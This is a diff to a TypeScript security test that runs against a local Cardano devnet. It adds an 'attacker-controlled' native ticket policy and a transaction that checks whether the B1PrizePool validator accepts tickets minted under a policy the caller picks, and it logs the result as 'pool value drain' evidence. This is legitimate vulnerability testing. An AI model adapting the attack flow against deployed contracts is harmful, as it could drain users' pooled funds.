@@ -41,6 +41,8 @@ const hashJson = (v: unknown) => createHash('sha256')
   .digest('hex')
 const nativePolicy = (keyHash: string): Script =>
   scriptFromNative({ type: 'all', scripts: [{ type: 'sig', keyHash }] } as any)
+const callerControlledTicketPolicy = (keyHash: string): Script =>
+  scriptFromNative({ type: 'any', scripts: [{ type: 'sig', keyHash }] } as any)
 
 const wallet = JSON.parse(readFileSync('/tmp/immortal-yaci-test-wallet.json','utf8')) as {
   purpose?: string; address?: string; seed?: string
@@ -107,6 +109,13 @@ if (!keyHash) throw new Error('Test wallet has no payment key hash')
 
 const policy = nativePolicy(keyHash)
 const policyId = mintingPolicyToId(policy)
+// Deliberately different from the Pool authority policy. This caller-controlled
+// native policy is not the canonical PRE-RICH Plutus MintPolicy.
+const attackerTicketPolicy = callerControlledTicketPolicy(keyHash)
+const attackerTicketPolicyId = mintingPolicyToId(attackerTicketPolicy)
+if (attackerTicketPolicyId === policyId) {
+  throw new Error('Test setup error: attacker ticket policy aliases the Pool authority policy')
+}
 const poolUnit = policyId + POOL_TOKEN_NAME
 const liquidityUnit = policyId + '5553444d'
 const scripts = buildScriptsFromLucid(
@@ -117,9 +126,9 @@ const scripts = buildScriptsFromLucid(
 if (!scripts.b1PrizePoolAddress || !scripts.prizeAddress || !scripts.b1PrizePoolHash) {
   throw new Error('Failed to derive B1 validator addresses')
 }
-function prizeDatum(name: string, now: bigint): any {
+function prizeDatum(name: string, now: bigint, ticketPolicyId: string = policyId): any {
   return c(0,[
-    policyId,name,'22'.repeat(32),PRICE,'33'.repeat(32),GAME_VERSION,1n,0n,'','',c(0),'',0n,
+    ticketPolicyId,name,'22'.repeat(32),PRICE,'33'.repeat(32),GAME_VERSION,1n,0n,'','',c(0),'',0n,
     c(0,[0n,0n,Buffer.from(ZERO32).toString('hex'),GAME_VERSION]),
     c(1),'','44'.repeat(32),Buffer.from(ZERO32).toString('hex'),scripts.b1PrizePoolHash,
     now,now+86_400_000n,0n,0n,
@@ -144,16 +153,16 @@ const initialPoolReference = ref(pool)
 
 // Positive control: direct B1 TicketIssued, preserving every Pool asset.
 const controlName = '4147454e5441434f4e54524f4c3031'
-const controlUnit = policyId + controlName
+const controlUnit = attackerTicketPolicyId + controlName
 const controlInputValue = sortedAssets(pool.assets)
 const controlTx = await lucid.newTx()
   .collectFrom([pool],Data.to(c(1,[PRICE])))
   .attach.SpendingValidator(scripts.b1PrizePool)
-  .mintAssets({[controlUnit]:1n},Data.void()).attach.MintingPolicy(policy)
+  .mintAssets({[controlUnit]:1n},Data.void()).attach.MintingPolicy(attackerTicketPolicy)
   .pay.ToContract(scripts.b1PrizePoolAddress,
     {kind:'inline',value:Data.to(poolDatum(scripts.prizeHash,PRICE,1n))},pool.assets)
   .pay.ToContract(scripts.prizeAddress,
-    {kind:'inline',value:Data.to(prizeDatum(controlName,now+1n))},
+    {kind:'inline',value:Data.to(prizeDatum(controlName,now+1n,attackerTicketPolicyId))},
     {lovelace:PRIZE_ADA,[controlUnit]:1n})
   .addSigner(address).complete({localUPLCEval:false})
 const controlSigned = await controlTx.sign.withWallet().complete({localUPLCEval:false})
@@ -249,12 +258,27 @@ if (accepted && continuing && prize) {
   classification = 'INCONCLUSIVE_PRE_SUBMISSION_OR_PROVIDER_FAILURE'
 }
 const evidence = {
-  schema:'AGENT-A-B1-TICKETISSUED-POOL-VALUE-DRAIN-v0.4',
+  schema:'AGENT-A-B1-TICKETISSUED-POOL-VALUE-DRAIN-v0.5',
   environment:'local-yaci-devnet-only',networkProvider:API,classification,
-  scope:'B1PrizePool TicketIssued; synthetic native liquidity token; native all(sig) test ticket policy',
+  scope:'B1PrizePool TicketIssued; attacker-controlled native ticket policy distinct from Pool authority; canonical MintPolicy/Counter/Treasury absent',
   exclusions:{productionMintPolicy:false,counterInput:false,treasuryReceipt:false,EEVAdmission:false,preprodOrMainnet:false,V3OrReveal:false},
   bootstrapHash,initialPoolReference,testPolicyId:policyId,poolUnit,liquidityUnit,
   liquiditySubunits:LIQUIDITY.toString(),priceSubunits:PRICE.toString(),
+  ticketPolicyBoundary:{
+    outcome:controlPool && controlPrize ? 'B1_ACCEPTED_DATUM_SELECTED_CALLER_CONTROLLED_NATIVE_POLICY' : 'NOT_ACCEPTED_OR_INCOMPLETE',
+    poolAuthorityPolicyId:policyId,
+    attackerTicketPolicyId,
+    ticketPolicyDiffersFromPoolAuthority:attackerTicketPolicyId !== policyId,
+    canonicalMintPolicyAttached:false,
+    counterInputPresent:false,
+    treasuryReceiptPresent:false,
+    prizeDatumPolicyId:attackerTicketPolicyId,
+    mintedTicketUnit:controlUnit,
+    transactionRef:controlHash,
+    poolPhysicalValuePreserved:controlPool ? sameAssets(controlInputValue,controlPool.assets) : false,
+    poolOutputReserve:PRICE.toString(),
+    poolOutputUnresolvedTicketCount:'1',
+  },
   positiveControl:{txHash:controlHash,ticketUnit:controlUnit,
     poolOutputFound:Boolean(controlPool),ticketOutputFound:Boolean(controlPrize),
     fullValuePreserved:sameAssets(controlInputValue,controlPool.assets),
@@ -267,7 +291,7 @@ const evidence = {
     walletLiquidity:walletLiquidity.toString(),prizeTicketOutputFound:Boolean(prize),
     originalPoolStillUnspent:originalStillUnspent,assertions},
   budget:{reusedControlBudgetForNegative:reusedControlBudget,negativeEvalError,physicalPoolValueGuardObserved},
-  evidenceDigest:hashJson({bootstrapHash,controlHash,txHash,accepted,stage,errorText,classification,assertions}),
+  evidenceDigest:hashJson({bootstrapHash,controlHash,attackerTicketPolicyId,txHash,accepted,stage,errorText,classification,assertions}),
 }
 writeFileSync(OUT+'/ticket-issued-pool-value-drain.json',JSON.stringify(evidence,null,2))
 console.log(JSON.stringify({event:'AGENT_A_POOL_VALUE_DRAIN_EVIDENCE',...evidence},null,2))
